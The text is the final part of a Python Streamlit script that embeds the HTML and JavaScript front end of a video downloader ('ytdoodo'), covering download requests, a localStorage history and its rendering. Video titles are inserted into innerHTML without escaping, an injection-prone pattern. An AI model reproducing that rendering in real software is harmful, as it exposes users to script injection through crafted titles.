            if(!query) { alert('Please enter a link first!'); return; }
            
            isDownloading = true;
            updateDownloadBadgeAndHistory();

            const timeString = new Date().toLocaleTimeString();
            userDownloads.unshift({ title: currentVideoTitle, format: selectedQualityType, time: timeString });
            localStorage.setItem('ytdoodo_downloads', JSON.stringify(userDownloads));
            
            setTimeout(() => { isDownloading = false; updateDownloadBadgeAndHistory(); }, 4000);
            window.location.href = `?download_url=${encodeURIComponent(query)}&format=${encodeURIComponent(selectedQualityType)}`;
        }

        function deleteDownload(index) {
            userDownloads.splice(index, 1);
            localStorage.setItem('ytdoodo_downloads', JSON.stringify(userDownloads));
            updateDownloadBadgeAndHistory();
        }

        function updateDownloadBadgeAndHistory() {
            const container = document.getElementById('downloadStatusContainer');
            if (userDownloads.length === 0) {
                container.innerHTML = `<div class="text-xs text-slate-400 bg-black p-4 rounded-xl border border-zinc-800 text-center">No downloaded media history yet!</div>`;
            } else {
                let html = '';
                userDownloads.forEach((d, idx) => {
                    html += `
                        <div class="bg-black p-3 rounded-xl border border-zinc-800 flex items-center justify-between text-xs">
                            <div class="space-y-1 truncate pr-2">
                                <p class="font-bold text-white truncate"><i class="fa-solid fa-file-video text-red-500 mr-1.5"></i> ${d.title}</p>
                                <p class="text-[10px] text-slate-400">Format: ${d.format} | Time: ${d.time}</p>
                            </div>
                            <div class="flex items-center space-x-2">
                                <span class="px-2 py-1 bg-green-950 text-green-400 border border-green-800 rounded-lg text-[10px] font-bold">Saved</span>
                                <button onclick="deleteDownload(${idx})" class="p-1.5 bg-red-950 hover:bg-red-900 text-red-400 rounded-lg border border-red-800 transition" title="Delete Item">
                                    <i class="fa-solid fa-trash text-xs"></i>
                                </button>
                            </div>
                        </div>
                    `;
                });
                container.innerHTML = html;
            }
        }
    </script>
</body>
</html>
"""

components.html(html_code, height=900, scrolling=True)
